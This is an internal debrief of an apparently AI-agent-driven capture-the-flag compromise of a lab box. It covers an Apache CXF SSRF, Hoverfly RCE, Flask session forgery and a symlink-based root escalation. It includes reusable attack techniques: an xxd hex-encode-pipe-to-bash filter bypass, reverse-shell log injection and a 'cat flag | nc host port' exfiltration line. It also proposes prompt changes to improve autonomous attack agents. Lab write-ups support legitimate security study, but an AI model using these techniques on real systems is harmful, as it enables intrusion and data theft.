# DevArea — Internal Debrief
> For: Operator + AI Crew
> Box: DevArea | Completed: 2026-03-28 | Sessions: 1 | Elliot turns: 17/43 total budget across 4 deployments

## Operation Timeline
| Phase | Duration | What Happened |
|-------|----------|---------------|
| Recon (Oracle) | 19:05–19:09Z | Full TCP scan, FTP anon, whatweb, JAR download + analysis |
| CVE Research (Oracle) | 19:09–19:13Z | CXF SSRF, Hoverfly CVEs identified and researched |
| SSRF Validation (Oracle) | 19:13–19:16Z | File read confirmed, Hoverfly creds recovered from systemd unit |
| Foothold (ELLIOT S1) | 19:18–19:20Z | Hoverfly middleware RCE → dev_ryan shell, user.txt. 3/10 turns |
| SSH Key Inject (ELLIOT S2) | 19:25–19:26Z | Stable SSH access. 2/8 turns |
| Post-Access Enum (NOIRE S1) | 19:28–19:31Z | SysWatch source recovered from zip, 3 critical privesc leads |
| Privesc Attempt (ELLIOT S3a) | 19:35–19:45Z | Flask forge + cmd injection validated. Plugin write blocked. 6/25 turns |
| Bridge Investigation (NOIRE S2) | 19:48–20:05Z | Live script diffs, symlink attack surface mapped |
| Bridge Analysis (Oracle) | 20:06–20:08Z | Read full syswatch.sh, identified log_message symlink gap |
| Privesc Success (ELLIOT S3b) | 20:09–20:20Z | Symlink attack → root via monitor.sh timer. 6/20 turns |

**Total wall-clock: ~75 minutes.** Recon-to-user: 15 min. User-to-root: 60 min.

## What Worked Well

**Oracle's recon-to-exploitation pipeline was clean.** CXF + Aegis identified from JAR analysis, CVE researched and validated with working PoC, creds recovered, and handoff written — all before the first ELLIOT deployment. The SSRF file read was the right primitive to prioritize.

**ELLIOT's foothold was surgical.** 3 turns for user flag, 2 turns for SSH key plant. The Hoverfly middleware RCE was correctly classified as trivial, and the turn budgets were tight and appropriate.

**The operator-gated workflow caught the privesc complexity correctly.** ELLIOT returned with an enumeration gap rather than burning 19 turns guessing. The handoff-return-redeploy cycle worked as designed.

**NOIRE's first deployment was excellent.** Recovered full SysWatch source from zip (bypassing ACL), identified three valid privesc leads, found Flask secret key and admin password, mapped the full architecture. Clean tradecraft — temp files cleaned.

**Oracle's independent analysis of syswatch.sh found the bridge.** While NOIRE was investigating, Oracle SCP'd the zip and read the full script, identifying the log_message symlink gap independently. This parallel analysis accelerated the operation.

## What We Got Wrong (And What It Cost)

### 1. attack_surface.md stated plugins/ was syswatch-writable — it wasn't
**What happened:** The initial attack surface doc said "Shell context: syswatch (uid 984) — can write to /opt/syswatch/plugins/" which was wrong. Plugins/ was root:root 755.
**Root cause:** Inference from syswatch owning /opt/syswatch rather than checking actual directory permissions.
**Cost:** ELLIOT spent 2 turns (T4-T5) discovering this and returning. The handoff should have flagged this as unverified.
**Fix:** Oracle should verify write permissions in handoff notes when the attack path depends on write access. Use CXF SSRF to `stat` directories before claiming writeability.

### 2. NOIRE S2 concluded "no write-to-execute bridge" — but missed the syswatch.sh log_message gap
**What happened:** NOIRE's summary stated "log_message always removes symlinks before writing" — this was true for common.sh's version but NOT syswatch.sh's version. Two different functions with the same name.
**Root cause:** NOIRE read both implementations but generalized from common.sh's behavior to all log_message functions.
**Cost:** Low — Oracle found it independently. But if Oracle hadn't, this could have stalled the operation.
**Fix:** NOIRE prompts should emphasize comparing ALL implementations of the same function name, not just the most prominent one. Add to deployment notes: "function name collision = compare all definitions."

### 3. SSH key injection into /root/.ssh/authorized_keys was attempted but failed
**What happened:** ELLIOT's first privesc attempt (primary path from handoff) was to symlink system.log → authorized_keys and inject a key via log_message. The write succeeded but SSH rejected the connection — likely StrictModes enforcing permissions on the newly-created file (>> creates with root's umask, possibly 644 instead of required 600).
**Root cause:** Oracle's handoff didn't account for sshd StrictModes requiring 600 permissions on authorized_keys. Files created by `>>` inherit umask, not explicit chmod.
**Cost:** 2 turns pivoting to backup path. Minor.
**Fix:** When handoff involves SSH key injection via file write primitive, note that sshd StrictModes requires `chmod 600` on authorized_keys and `chmod 700` on `.ssh/` — a raw `>>` without chmod will fail.

### 4. Hoverfly version was never confirmed
**What happened:** We never verified the exact Hoverfly version (only inferred "pre-1.12.0" from dashboard assets).
**Root cause:** All API endpoints required auth, and once we had auth we moved to exploitation.
**Cost:** None for this box (it was vulnerable), but on a hardened target this assumption could waste turns.
**Fix:** After getting auth, a quick `GET /api/v2/hoverfly` returns the version. One curl. Should be in the pre-exploitation checklist.

## Technical Lessons Learned

### XOP Include SSRF payload structure
The multipart/related boundary must use the exact `Content-Disposition: form-data; name="1"` format. The XOP Include goes inside any string-type element in the SOAP body. Content is returned base64-encoded in the response field — decode with `base64 -d`.

### Flask session forgery with itsdangerous
The Flask session cookie structure is `{base64_payload}.{timestamp}.{signature}`. The secret key signs the cookie. `flask-unsign --sign` handles the format. Session dict must match what the app checks — in this case `{"user_id": 1, "username": "admin"}`.

### xxd hex encode/decode bypass for regex filters
When a regex blocks `/`, uppercase, and special chars, hex-encode the full command and pipe through `xxd -r -p`:
```bash
echo -n 'COMMAND' | xxd -p | tr -d '\n'  # encode
echo HEX | xxd -r -p | bash              # decode + execute
```
This bypasses ANY character-based filter since the hex string only contains `[0-9a-f]`.

### Bash log line injection for file content control
When injecting into a log line via `$*` arguments to a logging function:
- The log prefix (timestamp, message) is garbage but bash processes it as a failed command and continues
- Newlines in arguments (`$'\n...\n'`) put the payload on its own line
- `#!/bin/bash` on a non-first line is treated as a comment (`#!`)
- The reverse shell command executes normally

### monitor.sh glob behavior
`/opt/syswatch/plugins/*.sh` does NOT match dotfiles (`.hidden.sh`). ELLIOT discovered this when `.cache-health.sh` wasn't picked up. Use non-dotfile names for plugin injection.

### monitor.sh hangs on persistent connections
If a plugin opens a reverse shell (persistent connection), monitor.sh's `wait` blocks indefinitely, preventing the timer from re-arming. For flag exfiltration, use non-persistent methods (`cat flag | nc host port` with a short timeout).

## Methodology Wins

**Turn budget system.** ELLIOT used 17 of 43 total allocated turns (40% utilization). The tight budgets on trivial tasks (10 for foothold, 8 for SSH key) prevented waste, while the larger privesc budget (25, then 20) gave room for the enumeration gap.

**Handoff gates.** The ELLIOT→Oracle→NOIRE→Oracle→ELLIOT cycle for the privesc enumeration gap was the system working correctly. ELLIOT identified "I need more information" rather than guessing, Oracle redeployed NOIRE with targeted questions, and the combined findings resolved the gap.

**Vulnerability primitive documentation.** Documenting the primitive (not just the technique) paid off in the privesc. The handoff described "syswatch.sh log_message writes to $LOG_DIR/system.log as root via >> without symlink checks" — this was precise enough for ELLIOT to execute without additional research.

**Memoria as state bridge.** Credentials, findings, and actions flowed cleanly across 4 ELLIOT deployments and 2 NOIRE deployments. The JWT token stored in session 1 was used by ELLIOT in session 3 without re-derivation.

## IRONTHREAD Iteration Notes

### 1. Oracle should verify write permissions before claiming them in handoffs
**File:** `oracle/ORACLE_SYSTEM_PROMPT.md`, Phase 4 section
**Proposed change:** Add to handoff checklist: "If the attack path depends on write access to a directory, verify with `stat` or SSRF before asserting it in handoff.json."

### 2. NOIRE needs stronger function-collision awareness
**File:** `noire/NOIRE_SYSTEM_PROMPT.md` or deployment notes
**Proposed change:** Add investigation heuristic: "When a function name appears in multiple files (e.g., log_message in common.sh AND syswatch.sh), compare ALL implementations. Different security properties = finding."

### 3. Handoff schema should include a "prerequisites_verified" field
**File:** `shared/schemas/HANDOFF_SCHEMA.json`
**Proposed change:** Add optional `prerequisites_verified` array with entries like `{"claim": "syswatch can write to plugins/", "verified": false, "method": "inferred from ownership"}`. This forces Oracle to be explicit about what's assumed vs confirmed.

### 4. Post-SSH-key-injection checklist
**File:** `oracle/ORACLE_SYSTEM_PROMPT.md` or tradecraft playbook
**Proposed change:** When handoff involves SSH key injection via file append (>>), note: "sshd StrictModes requires 600 on authorized_keys and 700 on .ssh/. A raw >> without chmod may fail. Consider chmod in the same write operation, or use a backup path."

## What We'd Do Differently Next Time

1. **Verify directory permissions via SSRF before writing the first privesc handoff.** Would have saved 2 ELLIOT turns and avoided the enumeration gap.
2. **Confirm Hoverfly version immediately after getting auth.** One API call, eliminates an assumption.
3. **Include `chmod 600` in any SSH key injection payload.** Would have made the primary privesc path work on the first attempt.
4. **Have NOIRE explicitly diff function names across all files** rather than trusting the most-sourced version as authoritative.
5. **Use non-persistent payloads for root execution via timer.** The hanging monitor.sh was avoidable with a `timeout` wrapper or fire-and-forget nc.

## Stats
| Metric | Value |
|--------|-------|
| Total wall-clock | ~75 minutes |
| Recon → user flag | ~15 minutes |
| User → root flag | ~60 minutes |
| ELLIOT deployments | 4 (foothold, SSH key, privesc attempt, privesc success) |
| ELLIOT turns used/budget | 17/43 (40%) |
| NOIRE deployments | 2 (initial enum, bridge investigation) |
| CVEs exploited | 2 (CVE-2024-28752, CVE-2025-54123) |
| CVEs identified but unused | 2 (CVE-2025-54376, CVE-2024-45388) |
| Credentials recovered | 5 (Hoverfly password, JWT token, SSH key, SysWatch password, Flask secret) |
| Dead ends | 3 (direct plugin write, SSH key into root authorized_keys, dotfile plugin name) |

## CVE Reference Card
| CVE | Product | Primitive | How We Used It |
|-----|---------|-----------|----------------|
| CVE-2024-28752 | Apache CXF 3.2.14 (Aegis) | XOP Include in multipart SOAP → SSRF/file read | Read systemd units → Hoverfly creds |
| CVE-2025-54123 | Hoverfly <= 1.11.3 | Unsanitized script/binary fields → /bin/bash exec | RCE as dev_ryan (foothold + SSH key plant) |
| CVE-2025-54376 | Hoverfly <= 1.11.3 | WebSocket /api/v2/ws/logs bypasses auth | Validated but not operationally useful |
| CVE-2024-45388 | Hoverfly < 1.10.3 | bodyFile directory traversal in /api/v2/simulation | Identified as backup, not used |

## Flags
```
user.txt: [REDACTED]
root.txt: [REDACTED]
```
